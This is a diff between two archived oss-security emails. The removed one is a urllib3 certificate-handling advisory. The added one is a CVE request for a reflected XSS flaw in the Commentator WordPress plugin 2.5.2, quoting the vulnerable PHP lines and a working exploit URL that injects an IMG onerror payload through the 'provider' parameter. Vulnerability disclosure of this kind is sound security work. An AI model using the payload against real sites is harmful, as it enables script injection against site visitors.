@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["660" "Wednesday" "17" "April" "2019" "14:21:35" "-0400" "Havoc Pennington" "hp@tidelift.com" "<CAC7nai00CbzPWbcd2pF-E6hi8pKBrUF5+oanEd++ME1FtsJaoQ@mail.gmail.com>" "17" "[oss-security] urllib3: adds system certificates to ssl_context" "^Date:" nil nil "4" "2019041718:21:35" "[oss-security] urllib3: adds system certificates to ssl_context" (number mark "        hp@tidelift. Apr 17   17/660   " thread-indent "\"[oss-security] urllib3: adds system certificates to ssl_context\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] urllib3: adds system certificates to ssl_context" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1323" "Wednesday" "13" "January" "2016" "19:42:12" "+0530" "Rahul Pratap Singh" "techno.rps@gmail.com" "<CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>" "48" "[oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability" "^Date:" nil nil "1" "2016011314:12:12" "[oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability" (number mark "        techno.rps@g Jan 13   48/1323  " thread-indent "\"[oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 19887 invoked by uid 550); 17 Apr 2019 19:31:07 -0000
+Received: (qmail 17727 invoked by uid 550); 13 Jan 2016 14:27:46 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,55 +11,85 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 15740 invoked from network); 17 Apr 2019 18:21:58 -0000
+Received: (qmail 3329 invoked from network); 13 Jan 2016 14:12:24 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=tidelift-com.20150623.gappssmtp.com; s=20150623;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=hpLTAh0VLjPgVQLSy7ejz3R3dlGkZRxONnnSTmKtKoI=;
-        b=V403B9dRFW2LbLcCXQZHsVG1Gkz0Y9X8EbsPy5ewrJwI+mzV1sTD5swTikjr05MJx4
-         BJSfIKEHc06mQiXGUoYk0WIJ4NHJrhwaC6ZoDoPQegSJQayx/uqRhfsu+FhJPpvcbiua
-         ALNMpV3BOzNFgxhnRTVS+e89334lugz0weLoC4Cavko3D/nwMjQxjnBHzvW3MLh2WOJJ
-         XPb4GDIHx2zA611zQrEOt2TeXd6fttPUeGuB7Pp7/tK6ngAKLQnQX6hV4x76BG9igJ8j
-         W2f2HDndpJeqE06a0KLSO9qYy90wz9Joxsb4HstFQucgRfDmnrhKs5KO4Mg8SAq9kODn
-         1atg==
+        d=gmail.com; s=20120113;
+        h=mime-version:date:message-id:subject:from:to:content-type;
+        bh=iO1N4XNUVzG1Hz3eSly/f+knQgnzqnsqocLWo336tb4=;
+        b=mUFZKmWo8zIRnja0xN8xapSop2vDth3jtlTUG8zWxD93BACcRB5QE9J5qOS5xbZvUj
+         7ugYKzq2B2FPRD//9s6oNiHPRl//7ssK1msj6wYO8SepLdPkXQLzrTd1qoMp3zC5ClRe
+         /Os25aP6BaaFWIJYFBkEPPBfDLYNYAHubez7eYhpvGew4RZ4sc3HpTPY8zY43RZ557mm
+         9qqb4970Y/eOYlsSxleNJxyurohMtC9rwiFSrtKOnwDza5CKl82GUMbXgq9uRQb7pn3t
+         lrSaz6v4mxPoJeoaFXd92GWbh4FMKPGvoQd/CwY9wuQlafOxl51bLPchmpHytHLtVAmP
+         V50Q==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=hpLTAh0VLjPgVQLSy7ejz3R3dlGkZRxONnnSTmKtKoI=;
-        b=nebPZmS80S0QXZJFTNKKoOTM3aaH+GSaHJeLkrRX6poyZvpvBx6oDws1FU9gkzzcEX
-         O7vPgU7A/Vn5zXSV60vDX6M08vVAjsZnMUztK3tqbMHeWQtUhEcBQhdQbAO8E+/67bnu
-         2ndAu7BRLB3/ukhJgaiqrlCr7lqSdXPJPAWP6WUtNuadyhR+g+raCq4SNvfrjWOkkGSp
-         YmILO9c39HYkD2V5bzoftQKO1I8IYrvt1F+YBArNwqE8AhdPFOqkdwh1pNHE4bXMGDIq
-         QohtoIQCnSpRPLy1sszIthhVXq58HbTr7+hMr+7j4oBoHPvt5KIIWBMVpyCFYYqg6Rw8
-         xRqg==
-X-Gm-Message-State: APjAAAUvKb3jvoWsKCLjJJ5czC7Vl62hrdCNcjd/TKED2oCl2X7I4sZB
-	DJ/O5xgLV0+2WJ2a4ICdE2HlGQorD1s715s5FJmmiJ8WJZ3VSkWB
-X-Google-Smtp-Source: APXvYqyTe9u3KIhPB2YTBF+jnF5ZFxe6hSfMnNhl2ERI9RrHJmdQSrMvXztIFv32gpoeckn6MQAN8gJ/qrcTDnLu+eA=
-X-Received: by 2002:ac8:1aec:: with SMTP id h41mr68296305qtk.345.1555525306505;
- Wed, 17 Apr 2019 11:21:46 -0700 (PDT)
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
+         :content-type;
+        bh=iO1N4XNUVzG1Hz3eSly/f+knQgnzqnsqocLWo336tb4=;
+        b=kC1XS54KYS7h0J5sr47YoOLBFxzniEt+dbANDaI59RqfPbHc9nJhXd4Dty0uLYVgX/
+         hW4M9aY+hFEBZZwyKwXXs13uwwUQE3jHWmR1p+bWQgLErPm1LmIBwJxpQPGzrIx4MzGI
+         gUkvHcWNW6X0vsHmQN1rnlOywsNRQbg6D919CU3ZgCCWbNO2A8xhw7iPkAcIL++PQ/q4
+         l+UBIDzlrKswe7s2NaCMn5emtBoaEwlEnziqO7UzG13ufLoN1VkKjIU2OLwmpnqiJ5cL
+         ePI20XYBo4T2G7u5KPoZzzLSg8MRWLJ3jBJ0TTqySGHpCO6MPgEw8clC5ePrvMBpQCHf
+         ZXig==
+X-Gm-Message-State: ALoCoQlpiw+57/8HTkLkopDNOpTh6nxSnFwGKuAOXjAcgqhqGTjNc0lVaJPRoXZAUGotm/kYVgAehZznieuaNHd/d7uwBL4KVQ==
 MIME-Version: 1.0
-Message-ID: <CAC7nai00CbzPWbcd2pF-E6hi8pKBrUF5+oanEd++ME1FtsJaoQ@mail.gmail.com>
-Content-Type: text/plain; charset="UTF-8"
-Date: Wed, 17 Apr 2019 14:21:35 -0400
-From: Havoc Pennington <hp@tidelift.com>
+X-Received: by 10.50.21.10 with SMTP id r10mr23979934ige.93.1452694332154;
+ Wed, 13 Jan 2016 06:12:12 -0800 (PST)
+Message-ID: <CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>
+Content-Type: multipart/alternative; boundary=047d7b86eeaea2ab45052937c1b8
+Date: Wed, 13 Jan 2016 19:42:12 +0530
+From: Rahul Pratap Singh <techno.rps@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] urllib3: adds system certificates to ssl_context
+Subject: [oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability
 To: oss-security@lists.openwall.com
 
-A vulnerability has been discovered in the urllib3 Python library.
+--047d7b86eeaea2ab45052937c1b8
+Content-Type: text/plain; charset=UTF-8
 
-When verifying HTTPS connections when an SSLContext is passed to
-urllib3, system CA certificates will be loaded into the SSLContext
-by default in addition to any manually-specified CA certificates.
-This causes TLS handshakes that should fail given only the
-manually specified certs to succeed based on system CA certs.
+Reflected XSS Vulnerability:
 
-This affects urllib3 1.24.1 and below. The fix has been released
-in version 1.24.2.
+I would request you to assign CVE id to this issue.
 
-The vulnerability was reported by Christian Heimes.
+----------------------------------------
+Description:
+----------------------------------------
+"provider" parameter is not sanitized that leads to Reflected XSS.
 
-A CVE ID has been requested, will follow up with it when we have it.
+----------------------------------------
+Vulnerable Code:
+----------------------------------------
+file: commentator.php
 
-Best
-Havoc / on behalf of Tidelift security team & urllib3 team
+line:441
+$provider_name = $_REQUEST["provider"];
+
+line:544
+<div id="commentator-social-signin" class="commentator-<?php echo
+$provider_name; ?>">
+
+----------------------------------------
+Exploit:
+----------------------------------------
+/wp-admin/admin-ajax.php?action=commentator_social_signin&provider=facebook">%20<IMG%20SRC=axc%20onerror=alert(1)>
+
+----------------------------------------
+POC:
+----------------------------------------
+https://0x62626262.files.wordpress.com/2016/01/commentatorxsspoc.png
+
+Fix:
+Update to 2.5.3
+
+Disclosure Timeline:
+reported to vendor  : 9/1/2016
+vendor response     : 11/1/2016
+vendor acknowledged : 11/1/2016
+vendor deployed a patch: 11/1/2016
+
+Pub ref:
+http://codecanyon.net/item/commentator-wordpress-plugin/6425752
+https://0x62626262.wordpress.com/2016/01/13/commentator-wordpress-plugin-xss-vulnerability
+
+--047d7b86eeaea2ab45052937c1b8--
